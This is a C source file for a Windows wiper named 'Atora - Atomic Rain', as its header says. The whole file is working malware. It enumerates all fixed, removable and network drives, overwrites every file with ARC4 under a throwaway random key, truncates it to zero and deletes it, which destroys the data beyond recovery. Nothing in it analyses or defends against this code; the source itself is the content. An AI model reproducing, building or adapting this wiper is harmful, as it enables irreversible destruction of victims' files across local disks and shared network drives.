/*
  Name:             Atora - Atomic Rain. Windows version.
  Version:          5.62/12.06.20
  Compiler:         TCC ver 0.9.27
  Class:            Files shredder for Windows. Wiper.
  What is he doing: Encrypts all files on all local drives with a cipher ARC4
  SHA-2-256:        6d3856bcbcc37b402ea58362c60df20eddaed846d188c4a66753be267f49a3c1
  SHA-2-256_UPX:    7e5550ff5ac4fccf8c37af025119fd8153a5e6dd19d1f4f9e8c6b5198db52371
*/
#include <io.h>
#include <time.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <stddef.h>
#include <string.h>
#include <windows.h>

#define BUFFER_SIZE       8192
#define WIN_MAX_PATH_LEN 32767

char * PARAM_REWRITE_BYTE = "r+b";

char * expansion  = "*";
char * slash      = "\\";
char * t_one      = ".";
char * t_two      = "..";

size_t i, j;
size_t len_dir_memory = (32767 * 4);

typedef struct { /* 128 KiB == one catalog */
  uint8_t new_path_of_file [WIN_MAX_PATH_LEN];
  uint8_t file_of_path     [WIN_MAX_PATH_LEN];
  uint8_t path_file        [WIN_MAX_PATH_LEN];
  uint8_t path_for_delete  [WIN_MAX_PATH_LEN];
} DIR_MEMORY;

typedef struct {
  uint8_t data       [256];
  uint8_t secret_key [256];
  uint8_t input      [BUFFER_SIZE];
  uint8_t output     [BUFFER_SIZE];
} MEMORY_CTX;

void swap (uint8_t * a, uint8_t * b) {
  uint8_t t = *a;

  *a = *b;
  *b = t;
}

void arc4_init(MEMORY_CTX * ctx, const size_t length) {

  for (i = 0; i < 256; i++)
    ctx->secret_key[i] = (uint8_t)i;

  for (i = j = 0; i < 256; i++) {
    j = (j + ctx->data[i % length] + ctx->secret_key[i]) % 256;
    swap(&ctx->secret_key[i], &ctx->secret_key[j]);
  }

  i = j = 0;
}

void arc4(MEMORY_CTX * ctx, const size_t length) {
  for (register size_t k = 0; k < length; k++) {
    i = (i + 1) % 256;
    j = (j + ctx->secret_key[i]) % 256;
    swap(&ctx->secret_key[i], &ctx->secret_key[j]);
    ctx->output[k] = ctx->input[k] ^ ctx->secret_key[(ctx->secret_key[i] + ctx->secret_key[j]) % 256];
  }
}

int genrand(const int min, const int max) {
  return min + rand() % ((max + 1) - min);
}

void write_trash(MEMORY_CTX * ctx, const size_t length) {
  for (register size_t i = 0; i < length; i++) {
    ctx->data[i] = (uint8_t)genrand(0x00, 0xFF);
  }
}

void generate_key(MEMORY_CTX * ctx) {
  write_trash(ctx, 256);
  arc4_init(ctx, 256);
}

long int size_of_file(FILE * f) {

  fseek(f, 0, SEEK_END);
  long int result = ftell(f);
  fseek(f, 0, SEEK_SET);

  return result;
}

void file_encrypt(MEMORY_CTX * ctx, const char * filename) {
  FILE * file = fopen(filename, PARAM_REWRITE_BYTE);

  if (file == NULL) {
    return;
  }

  long int fsize = size_of_file(file);

  if ((fsize == -1L) || (fsize == 0)) {
    fclose(file);
    return;
  }

  long int position = 0;
  size_t   realread = 0;

  while (position < fsize) {
    realread = fread((void *)(ctx->input), 1, BUFFER_SIZE, file);

    arc4(ctx, realread);
    fseek(file, position, SEEK_SET);

    if (fwrite((void *)(ctx->output), 1, realread, file) != realread) {
      break;
    }

    fflush(file);
    position += (long int)realread;
  }

  memset((void *)(ctx->input),  0x00, BUFFER_SIZE);
  memset((void *)(ctx->output), 0x00, BUFFER_SIZE);

  (void)chsize(fileno(file), 0);

  fclose(file);
}

void search_all_files(MEMORY_CTX * ctx, uint8_t * path, uint8_t * mask) {
  WIN32_FIND_DATA wfd;
  HANDLE hfound;

  DIR_MEMORY * dir_memory = (DIR_MEMORY *)calloc(1, len_dir_memory);

  if (dir_memory == NULL) {
    return;
  }

  strcpy(dir_memory->file_of_path, path);
  strcat(dir_memory->file_of_path, slash);
  strcpy(dir_memory->path_for_delete, dir_memory->file_of_path);
  strcat(dir_memory->file_of_path, mask);

  if ((hfound = FindFirstFile(dir_memory->file_of_path, &wfd)) != INVALID_HANDLE_VALUE) {
    do {
      if ((strcmp(wfd.cFileName, t_two) != 0) && (strcmp(wfd.cFileName, t_one) != 0)) {
        if ((wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0) {
          strcpy(dir_memory->path_file, dir_memory->path_for_delete);
          strcat(dir_memory->path_file, wfd.cFileName);

          generate_key(ctx);
          file_encrypt(ctx, (char *)(dir_memory->path_file));
          (void)remove((char *)(dir_memory->path_file));
        }
        else {
          strcpy(dir_memory->new_path_of_file, path);
          strcat(dir_memory->new_path_of_file, slash);
          strcat(dir_memory->new_path_of_file, wfd.cFileName);

          search_all_files(ctx, dir_memory->new_path_of_file, mask);
        }
      }
    } while(FindNextFile(hfound, &wfd) != 0);
  }

  memset((void *)dir_memory, 0x00, len_dir_memory);
  free((void *)dir_memory);
  dir_memory = NULL;

  FindClose(hfound);
}

int checklogicaldisk(const uint8_t number_disk) {
  uint8_t logical_disk[4] = "::\\";
          logical_disk[0] = number_disk;

  uint32_t result = GetDriveType(logical_disk);

  if ((result == DRIVE_FIXED) || (result == DRIVE_REMOVABLE) || (result == DRIVE_REMOTE))
    return 0;
  else
    return (-1);
}

int main (void) {
  uint8_t local_disk[] = "::";
  size_t  memory_size = sizeof(MEMORY_CTX);

  MEMORY_CTX * memory = (MEMORY_CTX *)calloc(1, memory_size);

  if (memory != NULL) {

    for (uint8_t disk = 'A'; disk <= 'Z'; disk++) {
      if (checklogicaldisk(disk) == 0) {
        srand((uint32_t)time(NULL));

        local_disk[0] = disk;
        search_all_files(memory, local_disk, expansion);
      }
    }

    memset((void *)memory, 0x00, memory_size);
    free((void *)memory);
    memory = NULL;
  }

  return 0;
}
